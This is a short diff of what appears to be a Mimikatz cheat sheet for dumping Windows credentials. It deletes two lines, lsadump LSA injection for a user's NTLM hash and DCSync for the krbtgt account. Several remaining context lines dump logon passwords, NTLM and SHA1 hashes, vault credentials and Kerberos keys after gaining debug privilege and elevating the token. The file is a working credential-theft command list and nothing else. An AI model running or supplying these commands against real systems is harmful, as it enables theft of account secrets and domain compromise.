@@ -6,9 +6,6 @@
 privilege::debug
 token::elevate
 
-lsadump::lsa /inject /name:<user>    //NTLM hash of user
-lsadump::dcsync /user:krbtgt         //Hashes of specified user
-
 sekurlsa::logonpasswords //NTLM and SHA1 hashes
 sekurlsa::credman        //vault credentials
 sekurlsa::ekeys /aes128
